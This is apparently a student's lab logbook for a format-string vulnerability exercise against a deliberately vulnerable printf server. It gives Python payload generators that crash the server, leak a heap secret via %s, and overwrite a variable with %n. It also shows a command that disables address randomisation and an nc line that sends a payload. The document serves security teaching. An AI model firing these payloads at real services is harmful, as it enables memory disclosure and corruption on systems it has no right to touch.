 # LOGBOOK 7

This lab's objective is to learn more about format-string vulnerability. 

The format-string vulnerability is caused by code like `printf(user_input)`, where the contents of variable of user_input is provided by users. When this program is running with privileges (e.g., Set-UID program or server program), this printf statement becomes dangerous, because it can lead to one of the following consequences: (1) crash the program, (2) read from an arbitrary memory place, and (3) modify the values of in an arbitrary memory place. The last consequence is very dangerous because it can allow users to modify internal variables of a privileged program, and thus change the behavior of the program. (*)


## Environment Setup

### Turning Off Countermeasures

In order to make the tasks in this lab easier, we will disable address space randomization, a security feature that randomizes the starting addresses of the heap and stack.

```bash
$ sudo sysctl -w kernel.randomize_va_space=0
```

### The Vulnerable Program

The vulnerable code snippet is shown below. Due to the absence of a format string in the printf() call, any user-supplied input is interpreted as part of the format string, enabling unrestricted code injection. This means that an attacker can craft malicious input that will be executed by the program.

```c
unsigned int target = 0x11223344;
char *secret = "A secret message\n";

void myprintf(char *msg)
{
    printf(msg); // This line has a format-string vulnerability
}
```


## Task 1: Crashing the Program

To exploit a format-string vulnerability and crash a program, it is possible to use a command like `%s%s%s%s%s%s%s`. This manipulates the program to treat certain memory addresses as invalid pointers, leading to a segmentation fault.

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

for i in range(0, N, 2):
  content[i:i+2] = ("%s").encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

In our task, we exploited this vulnerability by filling the `buf` variable with multiple `%s` placeholders, that caused the server to crash. The format specifiers `%s` caused the server to look above the format string address in the opposite direction to that in which the stack grows, only stopping when it findes '\0' or by accessing an invalid memory location, causing a segmentation fault.


```echo %s%s%s%s | nc 10.9.0.5 9090```



## Task 2: Printing Out the Server Program’s Memory

**Task 2.A: Stack Data.**

For this task, the goal is to print out the data that is on the stack and to discover how many `%x` format specifiers are needed to print out the first four bytes of our input.
As suggested in lab guide, we startd by choosing a unique 4 bytes number, and we choose 0xAABBCCDD. 
Afterward, using a trial and error approach, we repeatedly used the "%x" format specifier until we reached the beginning of our string, allowing printf() to read its content. The required number of "%x" needed to acomplish this was 64. 


**Task 2.B: Heap Data**


Task 2.B required us to retrieve a secret message stored in the heap area. The server provided the address of the message, which is 0x080b4008, and we used the knowledge from the previous task to approach task 2.B.
The first step was to write the given address of the message (0x080b4008) in the first four bytes of the payload in the input string. Afterward, since this time our goal is to read the data stored in the specified address rather than the actual adress, we used 63 "%x" format specifiers in our input followed by a 64th "%s" format specifier which will print the desired message, given that “%s” will interpret the number as an address and reads its content.

The content of the secret message was: **"A secret message"**

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*63 + "%s"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```



![log7_task2B](./images/logbook-7/2.B.png)


## Task 3: Modifying the Server Program’s Memory

**Task 3.A: Change the value to a different value**

The purpose of this task is to change the content of `target` that is located in the address 0x080e5068 and has the value 0x11223344. To achieve this we will use the same strategy as before writting 63 times %x, but this time the input will be followed by a %n that overwrites the value of `target` instead of reading.

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*63 + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

![log7_task3A](./images/logbook-7/3.A.png)

As we can check, the value of `target` is now 0x000001fd.

***Task 3.B: Change the value to 0x5000***

As the previous one, we need to change the *target* value, although in this task we have to replace it to a specific value that is 0x5000. To complete the objective, in the input, before having %n, we need to use 20480 (0x5000 in decimal) characters as %n will right the number of characters read until there. The following lead us to the pretended outcome:

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.19980x" + "%.8x"*62 + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```
![log7_task3B](./images/logbook-7/3.B.png)